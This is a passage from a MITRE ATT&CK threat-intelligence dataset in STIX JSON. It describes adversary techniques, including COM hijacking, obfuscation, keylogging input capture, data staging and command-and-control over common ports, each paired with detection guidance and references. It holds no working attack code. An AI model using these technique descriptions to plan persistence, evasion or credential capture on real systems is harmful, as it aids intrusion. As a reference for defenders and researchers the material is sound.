<code>HKEY_CURRENT_USER\\Software\\Classes\\CLSID\\</code> may be anomalous and should be investigated since user objects will be loaded prior to machine objects in <code>HKEY_LOCAL_MACHINE\\SOFTWARE\\Classes\\CLSID\\</code>. (Citation: Endgame COM Hijacking) Registry entries for existing COM objects may change infrequently. When an entry with a known good path and binary is replaced or changed to an unusual value to point to an unknown binary in a new location, then it may indicate suspicious behavior and should be investigated. Likewise, if software DLL loads are collected and analyzed, any unusual DLL load that can be correlated with a COM object Registry modification may indicate COM hijacking has been performed.\n\nPlatforms: Windows\n\nData Sources: Windows Registry, DLL monitoring, Loaded DLLs\n\nDefense Bypassed: Autoruns Analysis\n\nPermissions Required: User\n\nContributors: ENDGAME", 
            "external_references": [
                {
                    "external_id": "T1122", 
                    "source_name": "mitre-attack", 
                    "url": "https://attack.mitre.org/wiki/Technique/T1122"
                }, 
                {
                    "description": "Microsoft. (n.d.). The Component Object Model. Retrieved August 18, 2016.", 
                    "source_name": "Microsoft Component Object Model", 
                    "url": "https://msdn.microsoft.com/library/ms694363.aspx"
                }, 
                {
                    "description": "G DATA. (2014, October). COM Object hijacking: the discreet way of persistence. Retrieved August 13, 2016.", 
                    "source_name": "GDATA COM Hijacking", 
                    "url": "https://blog.gdatasoftware.com/2014/10/23941-com-object-hijacking-the-discreet-way-of-persistence"
                }, 
                {
                    "description": "Ewing, P. Strom, B. (2016, September 15). How to Hunt: Detecting Persistence & Evasion with the COM. Retrieved September 15, 2016.", 
                    "source_name": "Endgame COM Hijacking", 
                    "url": "https://www.endgame.com/blog/how-hunt-detecting-persistence-evasion-com"
                }
            ], 
            "id": "attack-pattern--9b52fca7-1a36-4da0-b62d-da5bd83b4d69", 
            "kill_chain_phases": [
                {
                    "kill_chain_name": "mitre-attack", 
                    "phase_name": "defense-evasion"
                }, 
                {
                    "kill_chain_name": "mitre-attack", 
                    "phase_name": "persistence"
                }
            ], 
            "modified": "2018-04-18T17:59:24.739Z", 
            "name": "Component Object Model Hijacking", 
            "object_marking_refs": [
                "marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168"
            ], 
            "type": "attack-pattern", 
            "x_mitre_contributors": [
                "ENDGAME"
            ], 
            "x_mitre_data_sources": [
                "Windows Registry", 
                "DLL monitoring", 
                "Loaded DLLs"
            ], 
            "x_mitre_defense_bypassed": [
                "Autoruns Analysis"
            ], 
            "x_mitre_permissions_required": [
                "User"
            ], 
            "x_mitre_platforms": [
                "Windows"
            ]
        }, 
        {
            "created": "2017-05-31T21:31:43.540Z", 
            "created_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5", 
            "description": "Command and control (C2) information is encoded using a standard data encoding system. Use of data encoding may be to adhere to existing protocol specifications and includes use of ASCII, Unicode, Base64,  MIME, UTF-8, or other binary-to-text and character encoding systems. (Citation: Wikipedia Binary-to-text Encoding) (Citation: Wikipedia Character Encoding) Some data encoding systems may also result in data compression, such as gzip.\n\nDetection: Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used. (Citation: University of Birmingham C2)\n\nPlatforms: Linux, macOS, Windows\n\nData Sources: Packet capture, Process use of network, Process Monitoring, Network protocol analysis\n\nPermissions Required: User\n\nRequires Network: Yes\n\nContributors: Itzik Kotler, SafeBreach", 
            "external_references": [
                {
                    "external_id": "T1132", 
                    "source_name": "mitre-attack", 
                    "url": "https://attack.mitre.org/wiki/Technique/T1132"
                }, 
                {
                    "description": "Wikipedia. (2016, December 26). Binary-to-text encoding. Retrieved March 1, 2017.", 
                    "source_name": "Wikipedia Binary-to-text Encoding", 
                    "url": "https://en.wikipedia.org/wiki/Binary-to-text%20encoding"
                }, 
                {
                    "description": "Wikipedia. (2017, February 19). Character Encoding. Retrieved March 1, 2017.", 
                    "source_name": "Wikipedia Character Encoding", 
                    "url": "https://en.wikipedia.org/wiki/Character%20encoding"
                }, 
                {
                    "description": "Gardiner, J.,  Cova, M., Nagaraja, S. (2014, February). Command & Control Understanding, Denying and Detecting. Retrieved April 20, 2016.", 
                    "source_name": "University of Birmingham C2", 
                    "url": "https://arxiv.org/ftp/arxiv/papers/1408/1408.1136.pdf"
                }
            ], 
            "id": "attack-pattern--cc7b8c4e-9be0-47ca-b0bb-83915ec3ee2f", 
            "kill_chain_phases": [
                {
                    "kill_chain_name": "mitre-attack", 
                    "phase_name": "command-and-control"
                }
            ], 
            "modified": "2018-04-18T17:59:24.739Z", 
            "name": "Data Encoding", 
            "object_marking_refs": [
                "marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168"
            ], 
            "type": "attack-pattern", 
            "x_mitre_contributors": [
                "Itzik Kotler, SafeBreach"
            ], 
            "x_mitre_data_sources": [
                "Packet capture", 
                "Process use of network", 
                "Process Monitoring", 
                "Network protocol analysis"
            ], 
            "x_mitre_network_requirements": true, 
            "x_mitre_permissions_required": [
                "User"
            ], 
            "x_mitre_platforms": [
                "Linux", 
                "macOS", 
                "Windows"
            ]
        }, 
        {
            "created": "2017-05-31T21:30:49.546Z", 
            "created_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5", 
            "description": "Command-line interfaces provide a way of interacting with computer systems and is a common feature across many types of operating system platforms. (Citation: Wikipedia Command-Line Interface) One example command-line interface on Windows systems is cmd, which can be used to perform a number of tasks including execution of other software. Command-line interfaces can be interacted with locally or remotely via a remote desktop application, reverse shell session, etc. Commands that are executed run with the current permission level of the command-line interface process unless the command includes process invocation that changes permissions context for that execution (e.g. Scheduled Task).\n\nAdversaries may use command-line interfaces to interact with systems and execute other software during the course of an operation.\n\nDetection: Command-line interface activities can be captured through proper logging of process execution with command-line arguments. This information can be useful in gaining additional insight to adversaries' actions through how they use native processes or custom tools.\n\nPlatforms: Linux, Windows, macOS\n\nData Sources: Process command-line parameters, Process monitoring\n\nPermissions Required: Administrator, SYSTEM, User\n\nRemote Support: No", 
            "external_references": [
                {
                    "external_id": "T1059", 
                    "source_name": "mitre-attack", 
                    "url": "https://attack.mitre.org/wiki/Technique/T1059"
                }, 
                {
                    "description": "Wikipedia. (2016, June 26). Command-line interface. Retrieved June 27, 2016.", 
                    "source_name": "Wikipedia Command-Line Interface", 
                    "url": "https://en.wikipedia.org/wiki/Command-line%20interface"
                }
            ], 
            "id": "attack-pattern--7385dfaf-6886-4229-9ecd-6fd678040830", 
            "kill_chain_phases": [
                {
                    "kill_chain_name": "mitre-attack", 
                    "phase_name": "execution"
                }
            ], 
            "modified": "2018-04-18T17:59:24.739Z", 
            "name": "Command-Line Interface", 
            "object_marking_refs": [
                "marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168"
            ], 
            "type": "attack-pattern", 
            "x_mitre_data_sources": [
                "Process command-line parameters", 
                "Process monitoring"
            ], 
            "x_mitre_permissions_required": [
                "Administrator", 
                "SYSTEM", 
                "User"
            ], 
            "x_mitre_platforms": [
                "Linux", 
                "Windows", 
                "macOS"
            ], 
            "x_mitre_remote_support": false
        }, 
        {
            "created": "2017-05-31T21:31:04.710Z", 
            "created_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5", 
            "description": "Adversaries may enumerate files and directories or may search in specific locations of a host or network share for certain information within a file system. \n\n===Windows===\n\nExample utilities used to obtain this information are <code>dir</code> and <code>tree</code>. (Citation: Windows Commands JPCERT) Custom tools may also be used to gather file and directory information and interact with the Windows API.\n\n===Mac and Linux===\n\nIn Mac and Linux, this kind of discovery is accomplished with the <code>ls</code>, <code>find</code>, and <code>locate</code> commands.\n\nDetection: System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as Collection and Exfiltration, based on the information obtained.\n\nMonitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as Windows Management Instrumentation and PowerShell.\n\nPlatforms: Linux, macOS, Windows\n\nData Sources: File monitoring, Process command-line parameters, Process monitoring\n\nPermissions Required: User, Administrator, SYSTEM\n\nSystem Requirements: Some folders may require Administrator, SYSTEM or specific user depending on permission levels and access controls", 
            "external_references": [
                {
                    "external_id": "T1083", 
                    "source_name": "mitre-attack", 
                    "url": "https://attack.mitre.org/wiki/Technique/T1083"
                }, 
                {
                    "description": "Tomonaga, S. (2016, January 26). Windows Commands Abused by Attackers. Retrieved February 2, 2016.", 
                    "source_name": "Windows Commands JPCERT", 
                    "url": "http://blog.jpcert.or.jp/2016/01/windows-commands-abused-by-attackers.html"
                }
            ], 
            "id": "attack-pattern--7bc57495-ea59-4380-be31-a64af124ef18", 
            "kill_chain_phases": [
                {
                    "kill_chain_name": "mitre-attack", 
                    "phase_name": "discovery"
                }
            ], 
            "modified": "2018-04-18T17:59:24.739Z", 
            "name": "File and Directory Discovery", 
            "object_marking_refs": [
                "marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168"
            ], 
            "type": "attack-pattern", 
            "x_mitre_data_sources": [
                "File monitoring", 
                "Process command-line parameters", 
                "Process monitoring"
            ], 
            "x_mitre_permissions_required": [
                "User", 
                "Administrator", 
                "SYSTEM"
            ], 
            "x_mitre_platforms": [
                "Linux", 
                "macOS", 
                "Windows"
            ], 
            "x_mitre_system_requirements": [
                "Some folders may require Administrator, SYSTEM or specific user depending on permission levels and access controls"
            ]
        }, 
        {
            "created": "2017-05-31T21:30:32.662Z", 
            "created_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5", 
            "description": "Adversaries may attempt to make an executable or file difficult to discover or analyze by encrypting, encoding, or otherwise obfuscating its contents on the system or in transit. This is common behavior that can be used across different platforms and the network to evade defenses.\n\nPayloads may be compressed, archived, or encrypted in order to avoid detection. These payloads may be used during Initial Access or later to mitigate detection. Sometimes a user's action may be required to open and Deobfuscate/Decode Files or Information for User Execution. The user may also be required to input a password to open a password protected compressed/encrypted file that was provided by the adversary. (Citation: Volexity PowerDuke November 2016) Adversaries may also used compressed or archived scripts, such as Javascript.\n\nPortions of files can also be encoded to hide the plain-text strings that would otherwise help defenders with discovery. (Citation: Linux/Cdorked.A We Live Security Analysis) Payloads may also be split into separate, seemingly benign files that only reveal malicious functionality when reassembled. (Citation: Carbon Black Obfuscation Sept 2016)\n\nAdversaries may also obfuscate commands executed from payloads or directly via a Command-Line Interface. Environment variables, aliases, characters, and other platform/language specific semantics can be used to evade signature based detections and whitelisting mechanisms. (Citation: FireEye Obfuscation June 2017) (Citation: FireEye Revoke-Obfuscation July 2017) (Citation: PaloAlto EncodedCommand March 2017)\n\nAnother example of obfuscation is through the use of steganography, a technique of hiding messages or code in images, audio tracks, video clips, or text files. One of the first known and reported adversaries that used steganography activity surrounding Invoke-PSImage. The Duqu malware encrypted the gathered information from a victim's system and hid it into an image followed by exfiltrating the image to a C2 server. (Citation: Wikipedia Duqu) By the end of 2017, an adversary group used Invoke-PSImage to hide PowerShell commands in an image file (png) and execute the code on a victim's system. In this particular case the PowerShell code downloaded another obfuscated script to gather intelligence from the victim's machine and communicate it back to the adversary. (Citation: McAfee Malicious Doc Targets Pyeongchang Olympics)\n\nDetection: Detection of file obfuscation is difficult unless artifacts are left behind by the obfuscation process that are uniquely detectable with a signature. If detection of the obfuscation itself is not possible, it may be possible to detect the malicious activity that caused the obfuscated file (for example, the method that was used to write, read, or modify the file on the file system).\n\nFlag and analyze commands containing indicators of obfuscation and known suspicious syntax such as uninterpreted escape characters like '''^''' and '''\"'''. Windows' Sysmon and Event ID 4688 displays command-line arguments for processes. Deobfuscation tools can be used to detect these indicators in files/payloads. (Citation: GitHub Revoke-Obfuscation) (Citation: FireEye Revoke-Obfuscation July 2017) (Citation: GitHub Office-Crackros Aug 2016)\n\nObfuscation used in payloads for Initial Access can be detected at the network. Use network intrusion detection systems and email gateway filtering to identify compressed and encrypted attachments and scripts. Some email attachment detonation systems can open compressed and encrypted attachments. Payloads delivered over an encrypted connection from a website require encrypted network traffic inspection.\n\nPlatforms: Linux, macOS, Windows\n\nData Sources: Network protocol analysis, Process use of network, Binary file metadata, File monitoring, Malware reverse engineering, Process command-line parameters, Environment variable, Process Monitoring, Windows event logs, Network intrusion detection system, Email gateway, SSL/TLS inspection\n\nDefense Bypassed: Host forensic analysis, Signature-based detection, Host intrusion prevention systems, Application whitelisting, Process whitelisting, Log analysis, Whitelisting by file name or path\n\nContributors: Red Canary, Christiaan Beek, @ChristiaanBeek", 
            "external_references": [
                {
                    "external_id": "T1027", 
                    "source_name": "mitre-attack", 
                    "url": "https://attack.mitre.org/wiki/Technique/T1027"
                }, 
                {
                    "description": "Adair, S.. (2016, November 9). PowerDuke: Widespread Post-Election Spear Phishing Campaigns Targeting Think Tanks and NGOs. Retrieved January 11, 2017.", 
                    "source_name": "Volexity PowerDuke November 2016", 
                    "url": "https://www.volexity.com/blog/2016/11/09/powerduke-post-election-spear-phishing-campaigns-targeting-think-tanks-and-ngos/"
                }, 
                {
                    "description": "Pierre-Marc Bureau. (2013, April 26). Linux/Cdorked.A: New Apache backdoor being used in the wild to serve Blackhole. Retrieved September 10, 2017.", 
                    "source_name": "Linux/Cdorked.A We Live Security Analysis", 
                    "url": "https://www.welivesecurity.com/2013/04/26/linuxcdorked-new-apache-backdoor-in-the-wild-serves-blackhole/"
                }, 
                {
                    "description": "Tedesco, B. (2016, September 23). Security Alert Summary. Retrieved February 12, 2018.", 
                    "source_name": "Carbon Black Obfuscation Sept 2016", 
                    "url": "https://www.carbonblack.com/2016/09/23/security-advisory-variants-well-known-adware-families-discovered-include-sophisticated-obfuscation-techniques-previously-associated-nation-state-attacks/"
                }, 
                {
                    "description": "Bohannon, D. & Carr N. (2017, June 30). Obfuscation in the Wild: Targeted Attackers Lead the Way in Evasion Techniques. Retrieved February 12, 2018.", 
                    "source_name": "FireEye Obfuscation June 2017", 
                    "url": "https://www.fireeye.com/blog/threat-research/2017/06/obfuscation-in-the-wild.html"
                }, 
                {
                    "description": "Bohannon, D. & Holmes, L. (2017, July 27). Revoke-Obfuscation: PowerShell Obfuscation Detection Using Science. Retrieved February 12, 2018.", 
                    "source_name": "FireEye Revoke-Obfuscation July 2017", 
                    "url": "https://www.fireeye.com/content/dam/fireeye-www/blog/pdfs/revoke-obfuscation-report.pdf"
                }, 
                {
                    "description": "White, J. (2017, March 10). Pulling Back the Curtains on EncodedCommand PowerShell Attacks. Retrieved February 12, 2018.", 
                    "source_name": "PaloAlto EncodedCommand March 2017", 
                    "url": "https://researchcenter.paloaltonetworks.com/2017/03/unit42-pulling-back-the-curtains-on-encodedcommand-powershell-attacks/"
                }, 
                {
                    "description": "Wikipedia. (2017, December 29). Duqu. Retrieved April 10, 2018.", 
                    "source_name": "Wikipedia Duqu", 
                    "url": "https://en.wikipedia.org/wiki/Duqu"
                }, 
                {
                    "description": "Saavedra-Morales, J., Sherstobitoff, R. (2018, January 6). Malicious Document Targets Pyeongchang Olympics. Retrieved April 10, 2018.", 
                    "source_name": "McAfee Malicious Doc Targets Pyeongchang Olympics", 
                    "url": "https://securingtomorrow.mcafee.com/mcafee-labs/malicious-document-targets-pyeongchang-olympics/"
                }, 
                {
                    "description": "Bohannon, D. (2017, July 27). Revoke-Obfuscation. Retrieved February 12, 2018.", 
                    "source_name": "GitHub Revoke-Obfuscation", 
                    "url": "https://github.com/danielbohannon/Revoke-Obfuscation"
                }, 
                {
                    "description": "Carr, N. (2016, August 14). OfficeCrackros. Retrieved February 12, 2018.", 
                    "source_name": "GitHub Office-Crackros Aug 2016", 
                    "url": "https://github.com/itsreallynick/office-crackros"
                }
            ], 
            "id": "attack-pattern--b3d682b6-98f2-4fb0-aa3b-b4df007ca70a", 
            "kill_chain_phases": [
                {
                    "kill_chain_name": "mitre-attack", 
                    "phase_name": "defense-evasion"
                }
            ], 
            "modified": "2018-04-18T17:59:24.739Z", 
            "name": "Obfuscated Files or Information", 
            "object_marking_refs": [
                "marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168"
            ], 
            "type": "attack-pattern", 
            "x_mitre_contributors": [
                "Red Canary", 
                "Christiaan Beek, @ChristiaanBeek"
            ], 
            "x_mitre_data_sources": [
                "Network protocol analysis", 
                "Process use of network", 
                "Binary file metadata", 
                "File monitoring", 
                "Malware reverse engineering", 
                "Process command-line parameters", 
                "Environment variable", 
                "Process Monitoring", 
                "Windows event logs", 
                "Network intrusion detection system", 
                "Email gateway", 
                "SSL/TLS inspection"
            ], 
            "x_mitre_defense_bypassed": [
                "Host forensic analysis", 
                "Signature-based detection", 
                "Host intrusion prevention systems", 
                "Application whitelisting", 
                "Process whitelisting", 
                "Log analysis", 
                "Whitelisting by file name or path"
            ], 
            "x_mitre_platforms": [
                "Linux", 
                "macOS", 
                "Windows"
            ]
        }, 
        {
            "created": "2017-05-31T21:31:17.472Z", 
            "created_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5", 
            "description": "Adversary tools may directly use the Windows application programming interface (API) to execute binaries. Functions such as the Windows API CreateProcess will allow programs and scripts to start other processes with proper path and argument parameters. (Citation: Microsoft CreateProcess)\n\nAdditional Windows API calls that can be used to execute binaries include: (Citation: Kanthak Verifier)\n\n*CreateProcessA() and CreateProcessW(),\n*CreateProcessAsUserA() and CreateProcessAsUserW(),\n*CreateProcessInternalA() and CreateProcessInternalW(),\n*CreateProcessWithLogonW(), CreateProcessWithTokenW(),\n*LoadLibraryA() and LoadLibraryW(),\n*LoadLibraryExA() and LoadLibraryExW(),\n*LoadModule(),\n*LoadPackagedLibrary(),\n*WinExec(),\n*ShellExecuteA() and ShellExecuteW(),\n*ShellExecuteExA() and ShellExecuteExW()\n\nDetection: Monitoring API calls may generate a significant amount of data and may not be directly useful for defense unless collected under specific circumstances, since benign use of Windows API functions such as CreateProcess are common and difficult to distinguish from malicious behavior. Correlation of other events with behavior surrounding API function calls using API monitoring will provide additional context to an event that may assist in determining if it is due to malicious behavior. Correlation of activity by process lineage by process ID may be sufficient.\n\nPlatforms: Windows\n\nData Sources: API monitoring, Process monitoring\n\nPermissions Required: User, Administrator, SYSTEM\n\nRemote Support: No\n\nContributors: Stefan Kanthak", 
            "external_references": [
                {
                    "external_id": "T1106", 
                    "source_name": "mitre-attack", 
                    "url": "https://attack.mitre.org/wiki/Technique/T1106"
                }, 
                {
                    "description": "Microsoft. (n.d.). CreateProcess function. Retrieved December 5, 2014.", 
                    "source_name": "Microsoft CreateProcess", 
                    "url": "http://msdn.microsoft.com/en-us/library/ms682425"
                }, 
                {
                    "description": "Kanthak, S. (2017). Application Verifier Provider. Retrieved February 13, 2017.", 
                    "source_name": "Kanthak Verifier", 
                    "url": "https://skanthak.homepage.t-online.de/verifier.html"
                }
            ], 
            "id": "attack-pattern--391d824f-0ef1-47a0-b0ee-c59a75e27670", 
            "kill_chain_phases": [
                {
                    "kill_chain_name": "mitre-attack", 
                    "phase_name": "execution"
                }
            ], 
            "modified": "2018-04-18T17:59:24.739Z", 
            "name": "Execution through API", 
            "object_marking_refs": [
                "marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168"
            ], 
            "type": "attack-pattern", 
            "x_mitre_contributors": [
                "Stefan Kanthak"
            ], 
            "x_mitre_data_sources": [
                "API monitoring", 
                "Process monitoring"
            ], 
            "x_mitre_permissions_required": [
                "User", 
                "Administrator", 
                "SYSTEM"
            ], 
            "x_mitre_platforms": [
                "Windows"
            ], 
            "x_mitre_remote_support": false
        }, 
        {
            "created": "2017-05-31T21:30:48.728Z", 
            "created_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5", 
            "description": "Adversaries may attempt to get information about running processes on a system. Information obtained could be used to gain an understanding of common software running on systems within the network.\n\n===Windows===\n\nAn example command that would obtain details on processes is \"tasklist\" using the Tasklist utility.\n\n===Mac and Linux===\n\nIn Mac and Linux, this is accomplished with the <code>ps</code> command.\n\nDetection: System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as Lateral Movement, based on the information obtained.\n\nNormal, benign system and network events that look like process discovery may be uncommon, depending on the environment and how they are used. Monitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as Windows Management Instrumentation and PowerShell.\n\nPlatforms: Linux, macOS, Windows\n\nData Sources: Process command-line parameters, Process monitoring\n\nPermissions Required: User, Administrator, SYSTEM\n\nSystem Requirements: Administrator, SYSTEM may provide better process ownership details", 
            "external_references": [
                {
                    "external_id": "T1057", 
                    "source_name": "mitre-attack", 
                    "url": "https://attack.mitre.org/wiki/Technique/T1057"
                }
            ], 
            "id": "attack-pattern--8f4a33ec-8b1f-4b80-a2f6-642b2e479580", 
            "kill_chain_phases": [
                {
                    "kill_chain_name": "mitre-attack", 
                    "phase_name": "discovery"
                }
            ], 
            "modified": "2018-04-18T17:59:24.739Z", 
            "name": "Process Discovery", 
            "object_marking_refs": [
                "marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168"
            ], 
            "type": "attack-pattern", 
            "x_mitre_data_sources": [
                "Process command-line parameters", 
                "Process monitoring"
            ], 
            "x_mitre_permissions_required": [
                "User", 
                "Administrator", 
                "SYSTEM"
            ], 
            "x_mitre_platforms": [
                "Linux", 
                "macOS", 
                "Windows"
            ], 
            "x_mitre_system_requirements": [
                "Administrator, SYSTEM may provide better process ownership details"
            ]
        }, 
        {
            "created": "2017-05-31T21:30:58.938Z", 
            "created_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5", 
            "description": "Collected data is staged in a central location or directory prior to Exfiltration. Data may be kept in separate files or combined into one file through techniques such as Data Compressed or Data Encrypted.\n\nInteractive command shells may be used, and common functionality within cmd and bash may be used to copy data into a staging location.\n\nDetection: Processes that appear to be reading files from disparate locations and writing them to the same directory or file may be an indication of data being staged, especially if they are suspected of performing encryption or compression on the files.\n\nMonitor processes and command-line arguments for actions that could be taken to collect and combine files. Remote access tools with built-in features may interact directly with the Windows API to gather and copy to a location. Data may also be acquired and staged through Windows system management tools such as Windows Management Instrumentation and PowerShell.\n\nPlatforms: Linux, macOS, Windows\n\nData Sources: File monitoring, Process monitoring, Process command-line parameters", 
            "external_references": [
                {
                    "external_id": "T1074", 
                    "source_name": "mitre-attack", 
                    "url": "https://attack.mitre.org/wiki/Technique/T1074"
                }
            ], 
            "id": "attack-pattern--7dd95ff6-712e-4056-9626-312ea4ab4c5e", 
            "kill_chain_phases": [
                {
                    "kill_chain_name": "mitre-attack", 
                    "phase_name": "collection"
                }
            ], 
            "modified": "2018-04-18T17:59:24.739Z", 
            "name": "Data Staged", 
            "object_marking_refs": [
                "marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168"
            ], 
            "type": "attack-pattern", 
            "x_mitre_data_sources": [
                "File monitoring", 
                "Process monitoring", 
                "Process command-line parameters"
            ], 
            "x_mitre_platforms": [
                "Linux", 
                "macOS", 
                "Windows"
            ]
        }, 
        {
            "created": "2017-05-31T21:30:19.338Z", 
            "created_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5", 
            "description": "An adversary may compress data (e.g., sensitive documents) that is collected prior to exfiltration in order to make it portable and minimize the amount of data sent over the network. The compression is done separately from the exfiltration channel and is performed using a custom program or algorithm, or a more common compression library or utility such as 7zip, RAR, ZIP, or zlib.\n\nDetection: Compression software and compressed files can be detected in many ways. Common utilities that may be present on the system or brought in by an adversary may be detectable through process monitoring and monitoring for command-line arguments for known compression utilities. This may yield a significant amount of benign events, depending on how systems in the environment are typically used.\n\nIf the communications channel is unencrypted, compressed files can be detected in transit during exfiltration with a network intrusion detection or data loss prevention system analyzing file headers. (Citation: Wikipedia File Header Signatures)\n\nPlatforms: Linux, macOS, Windows\n\nData Sources: File monitoring, Binary file metadata, Process command-line parameters, Process monitoring\n\nRequires Network: No", 
            "external_references": [
                {
                    "external_id": "T1002", 
                    "source_name": "mitre-attack", 
                    "url": "https://attack.mitre.org/wiki/Technique/T1002"
                }, 
                {
                    "description": "Wikipedia. (2016, March 31). List of file signatures. Retrieved April 22, 2016.", 
                    "source_name": "Wikipedia File Header Signatures", 
                    "url": "https://en.wikipedia.org/wiki/List%20of%20file%20signatures"
                }
            ], 
            "id": "attack-pattern--b9f5dbe2-4c55-4fc5-af2e-d42c1d182ec4", 
            "kill_chain_phases": [
                {
                    "kill_chain_name": "mitre-attack", 
                    "phase_name": "exfiltration"
                }
            ], 
            "modified": "2018-04-18T17:59:24.739Z", 
            "name": "Data Compressed", 
            "object_marking_refs": [
                "marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168"
            ], 
            "type": "attack-pattern", 
            "x_mitre_data_sources": [
                "File monitoring", 
                "Binary file metadata", 
                "Process command-line parameters", 
                "Process monitoring"
            ], 
            "x_mitre_network_requirements": false, 
            "x_mitre_platforms": [
                "Linux", 
                "macOS", 
                "Windows"
            ]
        }, 
        {
            "created": "2017-05-31T21:30:48.323Z", 
            "created_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5", 
            "description": "Adversaries can use methods of capturing user input for obtaining credentials for Valid Accounts and information Collection that include keylogging and user input field interception.\n\nKeylogging is the most prevalent type of input capture, with many different ways of intercepting keystrokes, (Citation: Adventures of a Keystroke) but other methods exist to target information for specific purposes, such as performing a UAC prompt or wrapping the Windows default credential provider. (Citation: Wrightson 2012)\n\nKeylogging is likely to be used to acquire credentials for new access opportunities when Credential Dumping efforts are not effective, and may require an adversary to remain passive on a system for a period of time before an opportunity arises.\n\nAdversaries may also install code on externally facing portals, such as a VPN login page, to capture and transmit credentials of users who attempt to log into the service. This variation on input capture may be conducted post-compromise using legitimate administrative access as a backup measure to maintain network access through External Remote Services and Valid Accounts or as part of the initial compromise by exploitation of the externally facing web service. (Citation: Volexity Virtual Private Keylogging)\n\nDetection: Keyloggers may take many forms, possibly involving modification to the Registry and installation of a driver, setting a hook, or polling to intercept keystrokes. Commonly used API calls include SetWindowsHook, GetKeyState, and GetAsynceyState. (Citation: Adventures of a Keystroke) Monitor the Registry and file system for such changes and detect driver installs, as well as looking for common keylogging API calls. API calls alone are not an indicator of keylogging, but may provide behavioral data that is useful when combined with other information such as new files written to disk and unusual processes.\n\nMonitor the Registry for the addition of a Custom Credential Provider. (Citation: Wrightson 2012) Detection of compromised Valid Accounts in use by adversaries may help to catch the result of user input interception if new techniques are used.\n\nPlatforms: Linux, macOS, Windows\n\nData Sources: Windows Registry, Kernel drivers, Process monitoring, API monitoring\n\nPermissions Required: Administrator, SYSTEM\n\nContributors: John Lambert, Microsoft Threat Intelligence Center", 
            "external_references": [
                {
                    "external_id": "T1056", 
                    "source_name": "mitre-attack", 
                    "url": "https://attack.mitre.org/wiki/Technique/T1056"
                }, 
                {
                    "description": "Tinaztepe,  E. (n.d.). The Adventures of a Keystroke:  An in-depth look into keyloggers on Windows. Retrieved April 27, 2016.", 
                    "source_name": "Adventures of a Keystroke"
                }, 
                {
                    "description": "Wrightson, T. (2012, January 2). CAPTURING WINDOWS 7 CREDENTIALS AT LOGON USING CUSTOM CREDENTIAL PROVIDER. Retrieved November 12, 2014.", 
                    "source_name": "Wrightson 2012", 
                    "url": "http://blog.leetsys.com/2012/01/02/capturing-windows-7-credentials-at-logon-using-custom-credential-provider/"
                }, 
                {
                    "description": "Adair, S. (2015, October 7). Virtual Private Keylogging: Cisco Web VPNs Leveraged for Access and Persistence. Retrieved March 20, 2017.", 
                    "source_name": "Volexity Virtual Private Keylogging", 
                    "url": "https://www.volexity.com/blog/2015/10/07/virtual-private-keylogging-cisco-web-vpns-leveraged-for-access-and-persistence/"
                }
            ], 
            "id": "attack-pattern--bb5a00de-e086-4859-a231-fa793f6797e2", 
            "kill_chain_phases": [
                {
                    "kill_chain_name": "mitre-attack", 
                    "phase_name": "collection"
                }, 
                {
                    "kill_chain_name": "mitre-attack", 
                    "phase_name": "credential-access"
                }
            ], 
            "modified": "2018-04-18T17:59:24.739Z", 
            "name": "Input Capture", 
            "object_marking_refs": [
                "marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168"
            ], 
            "type": "attack-pattern", 
            "x_mitre_contributors": [
                "John Lambert, Microsoft Threat Intelligence Center"
            ], 
            "x_mitre_data_sources": [
                "Windows Registry", 
                "Kernel drivers", 
                "Process monitoring", 
                "API monitoring"
            ], 
            "x_mitre_permissions_required": [
                "Administrator", 
                "SYSTEM"
            ], 
            "x_mitre_platforms": [
                "Linux", 
                "macOS", 
                "Windows"
            ]
        }, 
        {
            "created": "2017-05-31T21:30:42.657Z", 
            "created_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5", 
            "description": "Adversaries may communicate over a commonly used port to bypass firewalls or network detection systems and to blend with normal network activity to avoid more detailed inspection. They may use commonly open ports such as\n* TCP:80 (HTTP)\n* TCP:443 (HTTPS)\n* TCP:25 (SMTP)\n* TCP/UDP:53 (DNS)\n\nThey may use the protocol associated with the port or a completely different protocol. \n\nFor connections that occur internally within an enclave (such as those between a proxy or pivot node and other nodes), examples of common ports are \n* TCP/UDP:135 (RPC)\n* TCP/UDP:22 (SSH)\n* TCP/UDP:3389 (RDP)\n\nDetection: Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used. (Citation: University of Birmingham C2)\n\nPlatforms: Linux, macOS, Windows\n\nData Sources: Packet capture, Netflow/Enclave netflow, Process use of network, Process monitoring\n\nRequires Network: Yes", 
            "external_references": [
                {
                    "external_id": "T1043", 
